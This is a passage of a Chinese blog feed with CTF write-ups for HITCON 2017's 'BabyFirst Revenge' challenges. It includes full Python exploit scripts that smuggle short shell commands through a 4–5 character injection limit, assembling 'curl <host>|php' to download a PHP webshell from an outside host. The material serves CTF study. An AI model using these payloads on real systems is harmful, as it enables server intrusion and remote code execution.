class="line"><span class="comment">#          'ls&gt;A',</span></span><br><span class="line"><span class="comment">#          'rm G*',</span></span><br><span class="line"><span class="comment">#          'rm T*',</span></span><br><span class="line"><span class="comment">#          '&gt;105\\',</span></span><br><span class="line"><span class="comment">#          '&gt;304\\',</span></span><br><span class="line"><span class="comment">#          '&gt;301\\',</span></span><br><span class="line"><span class="comment">#          '&gt;9\&gt;\\',</span></span><br><span class="line"><span class="comment">#          'ls&gt;&gt;A']</span></span><br><span class="line">r.get(reset)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> build:</span><br><span class="line">    s = r.get(cmd + i)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[%s]'</span> % s.status_code, s.url</span><br><span class="line"></span><br><span class="line">s = r.get(sandbox + <span class="string">'fun.php?cmd=uname -a'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n'</span> + <span class="string">'[%s]'</span> % s.status_code, s.url</span><br><span class="line"><span class="keyword">print</span> s.text</span><br></pre></td></tr></table></figure><h4 id="更多解答"><a href="#更多解答" class="headerlink" title="更多解答"></a>更多解答</h4><p><a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge</a></p><h3 id="BabyFirst-Revenge-v2"><a href="#BabyFirst-Revenge-v2" class="headerlink" title="BabyFirst Revenge v2"></a>BabyFirst Revenge v2</h3><blockquote><p>BabyFirst Revenge v2<br>This is the hardest version! Short enough?</p><p><a href="http://52.197.41.31/" target="_blank" rel="noopener">http://52.197.41.31/</a></p></blockquote><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><h4 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h4><p>这题是赛后看wp复现的，只到拿webshell的部分。</p><p>详细说明： <a href="https://findneo.github.io/171110Bypass4CLimit/">https://findneo.github.io/171110Bypass4CLimit/</a></p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target = <span class="string">'http://52.197.41.31/'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 存放待下载文件的公网主机的IP</span></span><br><span class="line">shell_ip = <span class="string">'xx.xx.xx.xx'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本机IP</span></span><br><span class="line">your_ip = r.get(<span class="string">'http://ipv4.icanhazip.com/'</span>).text.strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将shell_IP转换成十六进制</span></span><br><span class="line">ip = <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                     <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">'.'</span>)])</span><br><span class="line"></span><br><span class="line">reset = target + <span class="string">'?reset'</span></span><br><span class="line">cmd = target + <span class="string">'?cmd='</span></span><br><span class="line">sandbox = target + <span class="string">'sandbox/'</span> + \</span><br><span class="line">    hashlib.md5(<span class="string">'orange'</span> + your_ip).hexdigest() + <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload某些位置的可选字符</span></span><br><span class="line">pos0 = random.choice(<span class="string">'efgh'</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">'hkpq'</span>)</span><br><span class="line">pos2 = <span class="string">'g'</span>  <span class="comment"># 随意选择字符</span></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="comment"># 创建名为 dir 的文件</span></span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\&gt;'</span> % pos0,</span><br><span class="line">    <span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%st-'</span> % pos1,</span><br><span class="line">    <span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></span><br><span class="line">    <span class="comment"># 因为alphabetical序中t&gt;s</span></span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></span><br><span class="line">    <span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></span><br><span class="line"></span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></span><br><span class="line">    <span class="comment">#  dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></span><br><span class="line">    <span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></span><br><span class="line"></span><br><span class="line">    <span class="string">'*v&gt;%s'</span> % pos2,</span><br><span class="line">    <span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。</span></span><br><span class="line">    <span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></span><br><span class="line">    <span class="string">'&gt;p'</span>,</span><br><span class="line">    <span class="string">'&gt;ph\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">0</span>:<span class="number">2</span>],</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'sh '</span> + pos2,</span><br><span class="line">    <span class="comment"># sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></span><br><span class="line">    <span class="comment"># 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></span><br><span class="line">    <span class="string">'sh '</span> + pos0,</span><br><span class="line">    <span class="comment"># sh f 执行curl命令，下载文件，写入木马。</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">s = r.get(reset)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">4</span></span><br><span class="line">    s = r.get(cmd + i)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[%d]'</span> % s.status_code, s.url</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">s = r.get(sandbox + <span class="string">'fun.php?cmd=uname -a'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[%d]'</span> % s.status_code, s.url</span><br><span class="line"><span class="keyword">print</span> s.text</span><br></pre></td></tr></table></figure><h4 id="更多解答-1"><a href="#更多解答-1" class="headerlink" title="更多解答"></a>更多解答</h4><p><a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://speakerdeck.com/player/f81159300925466c88335f3cf740beb6" target="_blank" rel="noopener">来自小密圈里的那些奇技淫巧</a> </p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>如何绕过四个字符限制getshell</title>
      <link href="/171110Bypass4CLimit/"/>
      <url>/171110Bypass4CLimit/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文首发于安全客 (<a href="https://www.anquanke.com/post/id/87203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87203</a>)</p></blockquote><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>本文主要整理如何巧用Linux命令绕过命令注入点的字符数量限制，内容围绕HITCON CTF 2017 的两道题展开，先讲五个字符的限制，再讲四个字符的。在此感谢下主办方分享这么有趣的点子。</p><h3 id="热身"><a href="#热身" class="headerlink" title="热身"></a><strong>热身</strong></h3><p>问题的起源是 HITCON CTF 2017 的 BabyFirst Revenge 题，题目的主要代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BabyFirst Revenge</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><h3 id="冷静分析"><a href="#冷静分析" class="headerlink" title="冷静分析"></a><strong>冷静分析</strong></h3><p>目标环境根据每个访问者的IP为其在sandbox里新建一个文件夹并作为其工作目录，接受并执行访问者提交的命令。访问者可随时通过提交reset来重置环境。这是个有限制无回显的后门，命令长度要求小于等于5 ，我们会希望利用这一点撕开口子，往服务器上写一个自己的木马，从而扩大命令执行范围。</p><p>我们所面临的最主要问题是能够执行的命令长度太短，因此考虑把命令写进文件里再执行，命令的功能是下载我们指定的文件。</p><p>在此之前，先做些知识铺垫。</p><h4 id="IP的等价表示法"><a href="#IP的等价表示法" class="headerlink" title="IP的等价表示法"></a><strong>IP的等价表示法</strong></h4><p>IP地址本质上就是一个整数，只是通常用点分十进制表示，以至于我们反而不太熟悉它本来的样子。只要必要，我们可以用十六进制、长整数、八进制表示IP，大部分情况下效果是相同的。</p><p><img src="t010e7a86cdf1618e75.png" alt="t010e7a86cdf1618e75"></p><p>它们之间的转换也很方便：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ip = <span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="comment"># 十六进制</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">'.'</span>)])</span><br><span class="line"><span class="comment"># 长整数</span></span><br><span class="line"><span class="keyword">print</span> int(<span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">'.'</span>)]), <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 八进制</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'0'</span> + oct(int(<span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">'.'</span>)]), <span class="number">16</span>))</span><br></pre></td></tr></table></figure><h4 id="从网络下载文件"><a href="#从网络下载文件" class="headerlink" title="从网络下载文件"></a><strong>从网络下载文件</strong></h4><p><img src="t0179a43f9481b4fbc6.png" alt="t0179a43f9481b4fbc6.png"></p><h4 id="利用续行符拆分命令成多行"><a href="#利用续行符拆分命令成多行" class="headerlink" title="利用续行符拆分命令成多行"></a><strong>利用续行符拆分命令成多行</strong></h4><p><img src="t01d2eac72941e42be9.png" alt="t01745a941a746a7ac0.png"></p><h4 id="用两个字符在Linux下创建文件"><a href="#用两个字符在Linux下创建文件" class="headerlink" title="用两个字符在Linux下创建文件"></a><strong>用两个字符在Linux下创建文件</strong></h4><p><img src="t019808b722225de73d.png" alt="t01485c8bfc8fbf987f.png"></p><h4 id="将命令执行结果重定向到文件"><a href="#将命令执行结果重定向到文件" class="headerlink" title="将命令执行结果重定向到文件"></a><strong>将命令执行结果重定向到文件</strong></h4><p><img src="t012de068258a2e3d04.png" alt="http://p9.qhimg.com/t01e45c7a16d86c4e2c.png"></p><h4 id="利用重定向向文件追加内容"><a href="#利用重定向向文件追加内容" class="headerlink" title="利用重定向向文件追加内容"></a><strong>利用重定向向文件追加内容</strong></h4><p><img src="t015f5da0f73df752b7.png" alt="http://p2.qhimg.com/t0125c23ce2f3d45621.png"></p><h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a><strong>删除文件</strong></h4><p><img src="t0121856133157c3f34.png" alt="http://p4.qhimg.com/t01e267cc27d6277631.png"></p><h4 id="ls-的文件排列顺序"><a href="#ls-的文件排列顺序" class="headerlink" title="ls 的文件排列顺序"></a><strong>ls 的文件排列顺序</strong></h4><p>一句alphabetical耐人寻味，不过大致顺序就是如下图所示。</p><p><img src="t01c4dd700d11f91860.png" alt="http://p7.qhimg.com/t01e104d2e591a66fcd.png"></p><hr><h3 id="开始表演"><a href="#开始表演" class="headerlink" title="开始表演"></a><strong>开始表演</strong></h3><p>假设我有一台目标服务器能够访问到的公网主机，为了方便我把该主机IP转换成长整数，然后利用以上的知识将 curl ip &gt; A 用续行方式切割成多行写进文件 A ，然后执行 sh A 就可以下载到预先放在公网主机上的文件并且覆盖本地的文件A，而下载下来的文件内容是用来写PHP木马的PHP代码，我再执行 php A就可以写个自己的webshell进去啦。</p><p><img src="t016294d3a767429eab.png" alt="http://p8.qhimg.com/t0106f100f423201580.png"></p><p>这里比较取巧的是我的公网IP转成长整形恰好能分割成顺序的四段，如果构造不出来，可以试试十六进制，八进制，找台能用的主机等等：）或者继续往下看，还会有其他办法。</p><p>另外，其实GET也是能用的，只是目标主机里没有安装所以这题不能用。</p><p>接下来让我们完成最后30%的工作，写个exp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">url = <span class="string">'http://52.199.204.34/'</span></span><br><span class="line"><span class="comment"># 查询自己的IP</span></span><br><span class="line">ip = r.get(<span class="string">'http://ipv4.icanhazip.com/'</span>).text.strip()</span><br><span class="line">sandbox = url + <span class="string">'sandbox/'</span> + hashlib.md5(<span class="string">'orange'</span> + ip).hexdigest() + <span class="string">'/'</span></span><br><span class="line"> </span><br><span class="line">reset = url + <span class="string">'?reset'</span></span><br><span class="line">cmd = url + <span class="string">'?cmd='</span></span><br><span class="line">build = [<span class="string">'&gt;cur\',</span></span><br><span class="line"><span class="string">         '</span>&gt;l \<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>ls&gt;A<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>rm c*<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>rm l*<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>&gt;<span class="number">105</span>\<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>&gt;<span class="number">304</span>\<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>&gt;<span class="number">301</span>\<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>&gt;<span class="number">9</span>&gt;\<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>ls&gt;&gt;A<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>sh A<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>php A<span class="string">'</span></span><br><span class="line"><span class="string">         ]</span></span><br><span class="line"><span class="string"># 如果目标服务器有GET，这个也是可以打的</span></span><br><span class="line"><span class="string"># build = ['</span>&gt;GE\<span class="string">',</span></span><br><span class="line"><span class="string">#          '</span>&gt;T\ \<span class="string">',</span></span><br><span class="line"><span class="string">#          '</span>ls&gt;A<span class="string">',</span></span><br><span class="line"><span class="string">#          '</span>rm G*<span class="string">',</span></span><br><span class="line"><span class="string">#          '</span>rm T*<span class="string">',</span></span><br><span class="line"><span class="string">#          '</span>&gt;<span class="number">105</span>\<span class="string">',</span></span><br><span class="line"><span class="string">#          '</span>&gt;<span class="number">304</span>\<span class="string">',</span></span><br><span class="line"><span class="string">#          '</span>&gt;<span class="number">301</span>\<span class="string">',</span></span><br><span class="line"><span class="string">#          '</span>&gt;<span class="number">9</span>&gt;\<span class="string">',</span></span><br><span class="line"><span class="string">#          '</span>ls&gt;&gt;A<span class="string">']</span></span><br><span class="line"><span class="string">r.get(reset)</span></span><br><span class="line"><span class="string">for i in build:</span></span><br><span class="line"><span class="string">    s = r.get(cmd + i)</span></span><br><span class="line"><span class="string">    print '</span>[%s]<span class="string">' % s.status_code, s.url</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line">s = r.get(sandbox + 'fun.php?cmd=uname -a')</span><br><span class="line"><span class="keyword">print</span> <span class="string">'n'</span> + <span class="string">'[%s]'</span> % s.status_code, s.url</span><br><span class="line"><span class="keyword">print</span> s.text</span><br></pre></td></tr></table></figure><h4 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h4><p><img src="t014cfd9d61e5c45b44.png" alt="http://p1.qhimg.com/t013370047191f9904f.png"></p><hr><h3 id="挑战升级"><a href="#挑战升级" class="headerlink" title="挑战升级"></a><strong>挑战升级</strong></h3><p>这篇文章有趣的地方才刚刚开始。</p><p>代码只改了一个字符，但趣味已经不在一个量级。一脸懵逼的我看了大佬们的wp后兴奋不已。</p><p>BabyFirst Revenge v2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>])</span><br><span class="line"> </span><br><span class="line"><span class="meta">    @mkdir($sandbox)</span></span><br><span class="line"><span class="meta">    @chdir($sandbox)</span></span><br><span class="line">    <span class="keyword">if</span> (isset($_GET[<span class="string">'cmd'</span>]) &amp; &amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line"><span class="meta">        @exec($_GET['cmd'])</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isset($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line"><span class="meta">        @exec('/bin/rm -rf ' . $sandbox)</span></span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__)</span><br></pre></td></tr></table></figure><h3 id="热烈分析"><a href="#热烈分析" class="headerlink" title="热烈分析"></a><strong>热烈分析</strong></h3><p>只有四个字符的施展空间意味着我们能做的事情少之又少，但Linux本身的简洁给了我们机会。</p><p>突破之旅从神奇的星号 * 开始。</p><p><img src="t01c68ec189f2c38155.png" alt="http://p1.qhimg.com/t011d2b1095c9235710.png"></p><p>经过简单测试我们猜测 * 的作用相当于 <code>ls</code> 。这其实相当厉害，我们本就基本上可以创建任意名字的短文件，现在又可以一个字符就把这些文件名连起来当作命令执行，这提供了很大的想象空间。</p><p><img src="t01fbeb47c643a3f4fd.png" alt="http://p1.qhimg.com/t016acaa6a8c9c4497c.png"></p><p>还有本质上一样但现象很有趣的，待会儿会用到：</p><p><img src="t01cdd7b9abeb575d5f.png" alt="http://p7.qhimg.com/t015afceef8c0976153.png"></p><p>虽然这些特技提供了一些可能性，但是 ls 列出的文件顺序问题仍然是个挑战，我们很难在 alphabetical 序的基础上构造出有用的命令。</p><p>写入时间是我们可以控制的，如果能执行 ls –t（将文件按时间排序输出），那么只要把想执行的命令分割成若干段然后逆序写入，就可以随心所欲地构造出任意命令。考虑到 ls -t 本身就已经有4个字符了，我们故技重施，先将 ls -t &gt; f 写入文件 g 中，然后执行 sh g 即可将我们分段逆序写入的命令拼接起来。</p><p>在开始操作前，再介绍两个会用到的命令：dir 和 rev。</p><hr><h4 id="dir"><a href="#dir" class="headerlink" title="dir"></a><strong>dir</strong></h4><p>在GNU文档中有下图这样的描述：</p><p><img src="https://p5.ssl.qhimg.com/t01406e4dcc8e6ff0f7.png" alt="http://p1.qhimg.com/t014c12aa56fd9386f9.png"></p><p>虽然基本上和 ls 一样，但有两个好处，一是开头字母是d ，这使得它在 alphabetical 序中靠前，二是按列输出，不换行。</p><h4 id="rev"><a href="#rev" class="headerlink" title="rev"></a><strong>rev</strong></h4><p>这个前面出场过，可以反转文件每一行的内容。</p><p><img src="t010c4a372f495ce020.png" alt="http://p8.qhimg.com/t01184834f69bddb51a.png"></p><p>实验一下：</p><p><img src="t016a0cf34a18724b08.png" alt="http://p2.qhimg.com/t0192fac539940680bc.png"></p><h3 id="开始挑战"><a href="#开始挑战" class="headerlink" title="开始挑战"></a><strong>开始挑战</strong></h3><p>需要知道的命令和 tips 都已经介绍了，下面是代码和解释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target = <span class="string">'http://52.197.41.31/'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 存放待下载文件的公网主机的IP</span></span><br><span class="line">shell_ip = <span class="string">'xx.xx.xx.xx'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 本机IP</span></span><br><span class="line">your_ip = r.get(<span class="string">'http://ipv4.icanhazip.com/'</span>).text.strip()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将shell_IP转换成十六进制</span></span><br><span class="line">ip = <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                     <span class="keyword">for</span> i <span class="keyword">in</span> 